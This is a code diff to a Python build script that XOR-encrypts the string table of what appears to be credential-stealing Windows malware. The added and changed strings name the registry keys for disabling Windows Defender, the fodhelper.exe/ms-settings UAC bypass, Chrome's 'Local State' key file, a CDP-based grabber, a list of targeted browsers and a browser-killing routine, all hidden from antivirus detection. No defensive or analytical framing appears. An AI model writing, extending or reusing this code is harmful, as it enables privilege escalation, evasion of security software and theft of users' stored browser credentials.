@@ -424,22 +424,22 @@ def rewrite_encrypted_strings(key):
         ("persist_windows_update", "WindowsUpdate"),
         ("persist_notepad", "notepad.exe"),
         # Wide registry paths (UTF-16LE bytes, XOR'd)
-        ("wreg_defender", "SOFTWARE\\\\Microsoft\\\\Windows Defender"),
-        ("wreg_mssettings", "Software\\\\Classes\\\\ms-settings"),
+        ("wreg_defender", "SOFTWARE\\Policies\\Microsoft\\Windows Defender"),
+        ("wreg_mssettings", "Software\\Classes\\ms-settings\\Shell\\Open\\Command"),
         # Phase 31: Remaining wide strings (defender_disable, uac_bypass, elevator, cdp_grabber)
-        ("wreg_windefend", "SYSTEM\\\\CurrentControlSet\\\\Services\\\\WinDefend"),
+        ("wreg_windefend", "SYSTEM\\CurrentControlSet\\Services\\WinDefend"),
         ("wDisableAntiSpyware", "DisableAntiSpyware"),
         ("wStart", "Start"),
         ("wDelegateExecute", "DelegateExecute"),
-        ("wfodhelper", "C:\\\\Windows\\\\System32\\\\fodhelper.exe"),
+        ("wfodhelper", "C:\\Windows\\System32\\fodhelper.exe"),
         ("wShell_TrayWnd", "Shell_TrayWnd"),
         ("wwinlogon", "winlogon"),
-        ("wchrome_app_path", "\\\\Registry\\\\Machine\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\chrome.exe"),
+        ("wchrome_app_path", "\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"),
         ("wmirage_chrome", "mirage_chrome"),
-        ("wLocalState", "\\\\Local State"),
+        ("wLocalState", "\\Local State"),
         ("wLOCALAPPDATA", "LOCALAPPDATA"),
         ("wAPPDATA", "APPDATA"),
-        ("wprofilesini", "\\\\profiles.ini"),
+        ("wprofilesini", "\\profiles.ini"),
         # Phase 31: cdp_grabber.c narrow API name
         ("RemoveDirectoryW", "RemoveDirectoryW"),
         # Phase 31: Browser table entries (auto-generated)
@@ -584,6 +584,30 @@ def rewrite_encrypted_strings(key):
         ("bp_path_53", "Mail.ru\\\\Atom\\\\User Data"),
         # Config values
         ("changeme", "changeme"),
+        # Phase 35: Browser stem names for encrypted g_browser_stems[]
+        ("bp_stem_chrome", "chrome"),
+        ("bp_stem_msedge", "msedge"),
+        ("bp_stem_brave", "brave"),
+        ("bp_stem_opera", "opera"),
+        ("bp_stem_vivaldi", "vivaldi"),
+        ("bp_stem_chromium", "chromium"),
+        ("bp_stem_slimjet", "slimjet"),
+        ("bp_stem_yandex", "yandex"),
+        ("bp_stem_iron", "iron"),
+        ("bp_stem_falkon", "falkon"),
+        ("bp_stem_seamonkey", "seamonkey"),
+        ("bp_stem_waterfox", "waterfox"),
+        ("bp_stem_palemoon", "palemoon"),
+        ("bp_stem_basilisk", "basilisk"),
+        # Phase 35: strstr comparison strings for chromium.c
+        ("bp_cmp_edge", "Microsoft Edge"),
+        ("bp_cmp_brave", "BraveSoftware"),
+        ("bp_cmp_avast", "AVAST Software"),
+        ("bp_cmp_yandex", "Yandex"),
+        ("bp_cmp_chrome", "Chrome"),
+        # Phase 35: kill_browser_processes target
+        ("bp_kill_chrome", "chrome"),
+
     ]
 
     lines = []
